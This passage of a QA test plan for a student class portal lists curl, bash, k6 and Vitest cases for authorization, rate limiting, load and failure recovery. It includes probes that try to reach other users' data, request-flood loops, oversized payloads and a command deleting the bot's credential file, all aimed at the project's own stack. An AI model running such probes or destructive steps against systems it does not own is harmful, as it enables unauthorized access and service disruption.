STUDENT_B_CHAT_LOG_ID="..."
curl https://your-domain.me/api/v1/chat-logs/$STUDENT_B_CHAT_LOG_ID \
  -H "Cookie: $STUDENT_A_COOKIE"
# Expected: 404 (not found for this user, not 200 with B's data)

# TC-13.2.2: Student tries to read another student's profile
curl https://your-domain.me/api/v1/users/$ANOTHER_STUDENT_ID \
  -H "Cookie: $STUDENT_COOKIE"
# Expected: 403 Forbidden or only public fields (name, studentId) returned

# TC-13.2.3: Student tries to mark another user's notification as read
curl -X POST https://your-domain.me/api/v1/notifications/read \
  -H "Content-Type: application/json" \
  -H "Cookie: $STUDENT_COOKIE" \
  -d '{"ids":["other-users-notification-id"]}'
# Expected: 200 but no DB change for the other user's notification

# TC-13.2.4: Admin cannot view full student profile (phone) of another student
curl https://your-domain.me/api/v1/admin/users \
  -H "Cookie: $ADMIN_COOKIE"
# Expected: returns names and emails only (no phone, bio of students)
```

---

### 13.3 — Internal Route Exposure
**Tool:** curl from external IP

```bash
# TC-13.3.1: /api/v1/internal/* is blocked at Nginx level from external requests
curl https://your-domain.me/api/v1/internal/announcements \
  -X POST \
  -H "x-internal-secret: $INTERNAL_API_SECRET" \
  -H "Content-Type: application/json" \
  -d '{"title":"T","body":"B","type":"general"}'
# Expected: 403 from Nginx (blocked before reaching Next.js)

# TC-13.3.2: n8n panel at /n8n is inaccessible from the internet
curl -I https://your-domain.me/n8n/
# Expected: 403 Forbidden

# TC-13.3.3: Uptime Kuma at /uptime is inaccessible from the internet
curl -I https://your-domain.me/uptime/
# Expected: 403 Forbidden
```

---

## 14. Security Tests — Rate Limiting & DoS

### 14.1 — Per-IP Nginx Rate Limiting
**Tool:** bash loop

```bash
# TC-14.1.1: Auth endpoint blocks after 5 requests/minute
for i in {1..8}; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://your-domain.me/api/auth/signin)
  echo "Request $i: $CODE"
done
# Expected: requests 6-8 return 429

# TC-14.1.2: General API rate limit (30 req/min, burst 10)
for i in {1..35}; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" https://your-domain.me/api/v1/health)
  echo "Request $i: $CODE"
done
# Expected: after burst (10) is consumed, excess requests return 429

# TC-14.1.3: Rate limit resets after window expires
# Make 30 requests → wait 60s → make 5 more
# Expected: 5 new requests succeed
```

---

### 14.2 — Per-User Chatbot Rate Limiting
**Tool:** bash loop + valid session cookie

```bash
# TC-14.2.1: Chatbot returns 429 after 20 requests in 1 hour
for i in {1..22}; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://your-domain.me/api/v1/chat \
    -H "Content-Type: application/json" \
    -H "Cookie: $STUDENT_COOKIE" \
    -d '{"question":"What is the exam date?"}')
  echo "Request $i: $CODE"
done
# Expected: requests 1-20 return 200, requests 21-22 return 429

# TC-14.2.2: Rate limit is per USER, not per IP
# Two different users on same IP can each make 20 requests
# Start parallel requests with two different cookies
curl ... -H "Cookie: $STUDENT_A_COOKIE" &
curl ... -H "Cookie: $STUDENT_B_COOKIE" &
# Both should get 200 (independent counters)
```

---

### 14.3 — Gemini Global Rate Guard
**Tool:** Vitest (unit)

```typescript
test('TC-14.3.1: Global Gemini guard limits to 12 requests per 60 seconds', async () => {
  // Simulate 13 concurrent chat requests to the same endpoint
  // The 13th should get a 503 (Gemini guard triggered)
  // This protects the free tier 15 RPM limit
})
```

---

### 14.4 — Large Payload DoS Prevention
**Tool:** curl

```bash
# TC-14.4.1: Announcement body > 50,000 chars is rejected
python3 -c "import json; print(json.dumps({'title':'T','body':'x'*60000,'type':'general'}))" | \
curl -X POST https://your-domain.me/api/v1/admin/announcements \
  -H "Content-Type: application/json" \
  -H "Cookie: $ADMIN_COOKIE" \
  -d @-
# Expected: 400 (Zod maxLength validation)

# TC-14.4.2: File upload > 30MB is rejected by Nginx before reaching Next.js
dd if=/dev/zero bs=1M count=31 | curl -X POST https://your-domain.me/api/v1/admin/files \
  -H "Cookie: $ADMIN_COOKIE" \
  -F "file=@-;filename=huge.pdf"
# Expected: 413 Request Entity Too Large from Nginx

# TC-14.4.3: Chat question > 500 chars returns 400 (not sent to Gemini)
python3 -c "print('x'*501)" | \
curl -X POST https://your-domain.me/api/v1/chat \
  -H "Content-Type: application/json" \
  -H "Cookie: $STUDENT_COOKIE" \
  -d "{\"question\":\"$(python3 -c 'print(chr(120)*501)')\"}"
# Expected: 400, zero Gemini API calls made
```

---

## 15. Load & Stress Tests

### 15.1 — Baseline Load Test (Normal Class Traffic)
**File:** `load-tests/baseline.js`  
**Tool:** k6

```javascript
import http from 'k6/http'
import { check, sleep } from 'k6'

// Simulates 40 students all opening the portal simultaneously
export const options = {
  scenarios: {
    normal_load: {
      executor: 'ramping-vus',
      stages: [
        { duration: '30s', target: 40 },  // All 40 students arrive
        { duration: '2m',  target: 40 },  // Steady state
        { duration: '30s', target: 0 },   // Class ends, everyone leaves
      ],
    },
  },
  thresholds: {
    // TC-15.1.1: 95th percentile response time < 2 seconds
    http_req_duration: ['p(95)<2000'],
    // TC-15.1.2: Error rate < 1%
    http_req_failed: ['rate<0.01'],
    // TC-15.1.3: 99th percentile < 4 seconds
    'http_req_duration{percentile:99}': ['p(99)<4000'],
  },
}

const BASE = 'https://your-domain.me'
const COOKIE = 'next-auth.session-token=test-student-session'

export default function () {
  // TC-15.1.4: Dashboard load
  const dashRes = http.get(`${BASE}/dashboard`, { headers: { Cookie: COOKIE } })
  check(dashRes, { 'dashboard 200': r => r.status === 200 })

  // TC-15.1.5: Announcement feed
  const annRes = http.get(`${BASE}/api/v1/announcements`, { headers: { Cookie: COOKIE } })
  check(annRes, { 'announcements 200': r => r.status === 200 })

  // TC-15.1.6: Routine (Redis-cached)
  const routineRes = http.get(`${BASE}/api/v1/routine`, { headers: { Cookie: COOKIE } })
  check(routineRes, { 'routine 200': r => r.status === 200 })

  sleep(Math.random() * 3 + 1) // Students browse at different speeds
}
```

```bash
docker run --rm -i grafana/k6 run - < load-tests/baseline.js
```

**Expected:** All 6 thresholds pass. Server does not crash or OOM.

---

### 15.2 — Announcement Spike Test (CR Posts → Everyone Refreshes)
**File:** `load-tests/spike.js`  
**Tool:** k6

```javascript
export const options = {
  scenarios: {
    announcement_spike: {
      executor: 'ramping-vus',
      stages: [
        { duration: '5s',  target: 5  },   // Normal baseline
        { duration: '5s',  target: 40 },   // Sudden spike (push notification lands)
        { duration: '30s', target: 40 },   // Everyone loading announcements
        { duration: '10s', target: 5  },   // Drop back to normal
      ],
    },
  },
  thresholds: {
    // TC-15.2.1: Even at spike peak, p(95) < 3 seconds
    http_req_duration: ['p(95)<3000'],
    // TC-15.2.2: No 5xx errors during spike
    'http_req_failed{status:500}': ['rate<0.001'],
  },
}
```

**Expected:** Server absorbs the spike without errors. Redis-cached routes return instantly.

---

### 15.3 — Chatbot Concurrent Load
**File:** `load-tests/chatbot-load.js`  
**Tool:** k6

```javascript
export const options = {
  scenarios: {
    chatbot_peak: {
      executor: 'constant-vus',
      vus: 10,          // 10 concurrent chatbot users
      duration: '1m',
    },
  },
  thresholds: {
    // TC-15.3.1: Chatbot p(95) response under 10 seconds (streaming allowed)
    http_req_duration: ['p(95)<10000'],
    // TC-15.3.2: Rate-limited responses (429) are correctly returned, not 500
    http_req_failed: ['rate<0.05'],  // 5% may be rate-limited
  },
}

export default function () {
  const res = http.post(`${BASE}/api/v1/chat`,
    JSON.stringify({ question: 'What is the semester exam schedule?' }),
    { headers: { Cookie: COOKIE, 'Content-Type': 'application/json' } }
  )
  check(res, {
    'chat response is 200 or 429': r => r.status === 200 || r.status === 429 || r.status === 503,
  })
  sleep(5)
}
```

**Expected:** 429/503 responses are graceful. Gemini free tier is not exceeded. No 500 errors.

---

### 15.4 — Database Connection Pool Stress Test
**File:** `load-tests/db-stress.js`  
**Tool:** k6

```javascript
// TC-15.4.1: Simulate 50 concurrent DB-heavy requests
export const options = {
  scenarios: {
    db_stress: {
      executor: 'constant-vus',
      vus: 50,
      duration: '30s',
    },
  },
  thresholds: {
    http_req_duration: ['p(95)<5000'],
    http_req_failed: ['rate<0.02'],
  },
}

export default function () {
  // Each of these hits the DB
  http.get(`${BASE}/api/v1/exams`, { headers: { Cookie: COOKIE } })
  http.get(`${BASE}/api/v1/files`, { headers: { Cookie: COOKIE } })
  http.get(`${BASE}/api/v1/polls`, { headers: { Cookie: COOKIE } })
}
```

**Expected:** Prisma connection pool handles 50 concurrent queries without timeout cascades.

---

### 15.5 — WhatsApp Bot Message Queue Stress
**Tool:** bash loop

```bash
# TC-15.5.1: Send 20 messages in rapid succession to WhatsApp bot
for i in {1..20}; do
  curl -s -X POST http://localhost:3002/send \
    -H "x-internal-secret: $INTERNAL_API_SECRET" \
    -H "Content-Type: application/json" \
    -d "{\"message\":\"[STRESS TEST] Message $i\"}" &
done
wait
# Expected: All 20 messages queued and delivered; no crash, no lost messages

# TC-15.5.2: Bot reconnects automatically after network drop
docker network disconnect bridge ipe24-whatsapp-bot
sleep 10
docker network connect bridge ipe24-whatsapp-bot
sleep 30
curl http://localhost:3002/health
# Expected: { "connected": true } — bot reconnects
```

---

### 15.6 — Redis Memory & Eviction Under Load
**Tool:** redis-cli

```bash
# TC-15.6.1: Redis does not run out of memory with 40 active sessions
# After load test, check Redis memory
docker exec ipe24-redis redis-cli INFO memory | grep used_memory_human
# Expected: < 100MB

# TC-15.6.2: Session lookups remain fast under load
docker exec ipe24-redis redis-cli DEBUG sleep 0
time docker exec ipe24-redis redis-cli GET "test-session-key"
# Expected: < 5ms

# TC-15.6.3: Rate limit keys expire correctly
docker exec ipe24-redis redis-cli TTL "chat:user-abc"
# Expected: TTL > 0 (key has expiry set, won't leak permanently)
```

---

## 16. Resilience & Recovery Tests

### 16.1 — Database Failure Recovery
**Tool:** Docker

```bash
# TC-16.1.1: Application returns 503 gracefully when PostgreSQL is down
docker compose stop postgres
curl https://your-domain.me/api/v1/announcements -H "Cookie: $STUDENT_COOKIE"
# Expected: 503 or 500 with error message (NOT a crash/hang)
# App must NOT expose DB connection strings in error response

# TC-16.1.2: Application recovers automatically when DB comes back
docker compose start postgres
sleep 10
curl https://your-domain.me/api/v1/health
# Expected: { "status": "ok" }

# TC-16.1.3: Database backup restore test
# Restore from yesterday's backup
BACKUP=$(ls /backups/postgres/ | tail -1)
gunzip -c /backups/postgres/$BACKUP | docker exec -i ipe24-postgres psql -U ipe24 ipe24_db
# Expected: Data restored without error, app functions normally
```

---

### 16.2 — Redis Failure Recovery
**Tool:** Docker

```bash
# TC-16.2.1: App continues serving cached pages when Redis is down
docker compose stop redis
curl https://your-domain.me/api/v1/announcements -H "Cookie: $STUDENT_COOKIE"
# Expected: Either 200 (falls back to DB) or graceful 503 (not a crash)

# TC-16.2.2: Rate limiting fails open (allows requests) when Redis is unavailable
# This prevents Redis failure from locking out all users
# Depends on implementation — document the chosen behavior

# TC-16.2.3: Sessions survive Redis restart (database-backed sessions are not lost)
docker compose restart redis
curl https://your-domain.me/dashboard -H "Cookie: $STUDENT_COOKIE"
# Expected: Still authenticated (session is in PostgreSQL, not only Redis)
```

---

### 16.3 — WhatsApp Reconnection
**Tool:** Docker + manual

```bash
# TC-16.3.1: WhatsApp bot reconnects after container restart
docker compose restart whatsapp-bot
sleep 15
curl http://localhost:3002/health
# Expected: { "connected": true }

# TC-16.3.2: Auth session (QR scan state) survives container restart
# The auth_info/ volume must persist
docker compose stop whatsapp-bot
docker compose start whatsapp-bot
sleep 10
# Expected: Bot reconnects WITHOUT requiring QR re-scan

# TC-16.3.3: WhatsApp session invalidation is handled gracefully (logout scenario)
# Delete auth_info/creds.json
docker exec ipe24-whatsapp-bot rm /app/auth_info/creds.json
docker compose restart whatsapp-bot
curl http://localhost:3002/health
# Expected: { "connected": false }, health endpoint does NOT crash
```

---

### 16.4 — Graceful Shutdown
**Tool:** bash / Docker

```bash
# TC-16.4.1: SIGTERM is handled gracefully (Telegraf bot)
docker compose kill --signal=SIGTERM telegram-bot
docker compose logs telegram-bot | tail -5
# Expected: Log shows "Stopping Telegram bot..." not a crash trace

# TC-16.4.2: In-progress requests complete before shutdown (Next.js)
# While a chatbot streaming response is in progress:
docker compose stop web
# Expected: The streaming response completes or client gets a clean error
# Not a mid-stream silent disconnect that corrupts JSON

# TC-16.4.3: Database connections are released on shutdown
docker compose stop web
docker exec ipe24-postgres psql -U ipe24 ipe24_db -c "SELECT count(*) FROM pg_stat_activity WHERE application_name='ipe24-web';"
# Expected: 0 connections (all cleanly closed)
```

---

### 16.5 — Disk Space Exhaustion
**Tool:** bash

```bash
# TC-16.5.1: Application logs a warning (not crash) when disk is at 90%
# Simulate by filling disk temporarily — then check logs
df -h /
# Expected: App continues serving requests; writes degrade gracefully

# TC-16.5.2: Old backup files are deleted after 14 days
# Verify the crontab backup script deletes old files
find /backups/postgres -name "*.sql.gz" -mtime +14 | wc -l
# Expected: 0 (no files older than 14 days)
```

---

### 16.6 — Gemini API Failure
**Tool:** Vitest / mock

```typescript
// TC-16.6.1: When Gemini API returns 500, chatbot returns user-friendly error
test('TC-16.6.1: Gemini 500 → chatbot returns 503 not crash', async () => {
  vi.mock('@google/generative-ai', () => ({
    GoogleGenerativeAI: vi.fn(() => ({
      getGenerativeModel: vi.fn(() => ({
        startChat: vi.fn(() => ({
          sendMessageStream: vi.fn().mockRejectedValue(new Error('Service Unavailable')),
        })),
      })),
    })),
  }))
  // POST to /api/v1/chat
  // Expected: 503 with "AI temporarily unavailable" — not 500 crash
})

// TC-16.6.2: When Gemini returns malformed JSON (classification node), n8n retries
// Verify n8n workflow has error handling on the Parse Gemini Response node
```

---

## 17. Regression Checklist

Run this checklist before every production deployment. All checks must pass.

### Pre-Deploy Automated Checks
```bash
#!/bin/bash
set -e

echo "=== IPE-24 Pre-Deploy Regression Suite ==="

echo "[1/6] TypeScript type check..."
cd apps/web && npx tsc --noEmit
echo "✅ TypeScript OK"

echo "[2/6] ESLint..."
npm run lint
echo "✅ Lint OK"

echo "[3/6] Security audit..."
npm audit --audit-level=high
echo "✅ No high/critical vulnerabilities"

echo "[4/6] Unit + integration tests..."
npx vitest run --reporter=verbose
echo "✅ All unit tests pass"

echo "[5/6] Build..."
npm run build
echo "✅ Build succeeds"

echo "[6/6] E2E smoke tests (critical paths)..."
npx playwright test e2e/auth.spec.ts e2e/student.spec.ts --project=chromium
echo "✅ Critical E2E journeys pass"

echo ""
echo "=== ALL PRE-DEPLOY CHECKS PASSED — Safe to deploy ==="
```

---

### Manual Regression Checklist (Post-Deploy Verification)

```
AUTHENTICATION
[ ] Student can log in with valid @iut-dhaka.edu Google account
[ ] Non-IUT email shows domain error page
[ ] Non-whitelisted email shows roster error page
[ ] Admin login with email/password/TOTP works
[ ] Wrong TOTP shows clear error message
[ ] Session persists across page refreshes
[ ] Sign out clears session and redirects to /login

STUDENT FEATURES
[ ] Dashboard loads within 2 seconds
[ ] Announcements are paginated and load correctly
[ ] Class routine is visible (Google Sheets data)
[ ] Exam schedule shows countdown timers
[ ] Resources page lists files with download links
[ ] Poll voting works (one vote per user enforced)
[ ] Chatbot responds to a test question
[ ] Study group page is accessible
[ ] Profile page shows correct user data
[ ] Profile edit (phone/bio) saves correctly
[ ] Profile edit does NOT allow role change

ADMIN FEATURES
[ ] Admin dashboard loads
[ ] Create announcement (with TipTap editor) publishes to student feed
[ ] File upload appears in resource library
[ ] Create exam entry appears in exam schedule
[ ] Create poll appears in poll list
[ ] Audit log shows recent actions
[ ] User list shows all users (super_admin only)

AUTOMATION PIPELINE
[ ] Telegram bot responds to /start command
[ ] Sending text to Telegram bot triggers n8n
[ ] n8n preview message arrives in Telegram within 30 seconds
[ ] Approving with "yes" posts to website + Discord + WhatsApp
[ ] Website announcement appears for students
[ ] Discord embed appears in #announcements
[ ] WhatsApp message appears in group

SECURITY SPOT CHECKS
[ ] /admin is inaccessible to student session
[ ] /api/v1/internal is inaccessible without secret header
[ ] Rapid API calls trigger 429 responses
[ ] SSL certificate is valid (no browser warnings)
[ ] Security headers present (check securityheaders.com)

MONITORING
[ ] Uptime Kuma shows all services green
[ ] No error spikes in application logs
[ ] Database backup ran successfully in last 24 hours
[ ] Disk usage < 80%
```

---

## Coverage Targets Summary

| Layer | Target | Measurement |
|---|---|---|
| Utility functions (`lib/`) | **90%** | `npx vitest run --coverage` |
| API route handlers | **80%** | `npx vitest run --coverage` |
| React components | **70%** | `npx vitest run --coverage` |
| Security test scenarios | **100%** | Manual + automated |
| Critical E2E journeys | **100%** | Playwright |
| Load test thresholds | **100%** | k6 |

---

## Running the Full Suite

```bash
# 1. Unit tests only (fast — run on every save)
npx vitest --watch

# 2. Full unit + integration suite
npx vitest run --coverage

# 3. E2E tests (requires running server)
npx playwright test

# 4. Load tests (requires running server, k6 installed)
docker run --rm -i grafana/k6 run - < load-tests/baseline.js
docker run --rm -i grafana/k6 run - < load-tests/spike.js
docker run --rm -i grafana/k6 run - < load-tests/chatbot-load.js

# 5. Security scan (automated)
docker run --rm -t owasp/zap2docker-stable zap-baseline.py \
  -t https://your-domain.me -r zap-report.html

# 6. Full pre-deploy regression (runs all above in CI order)
bash scripts/regression.sh
```

---

*Generated for IPE-24 Class Portal — All test cases are agentic, self-contained, and mapped to the exact codebase, API contracts, and architecture defined in the project documentation.*
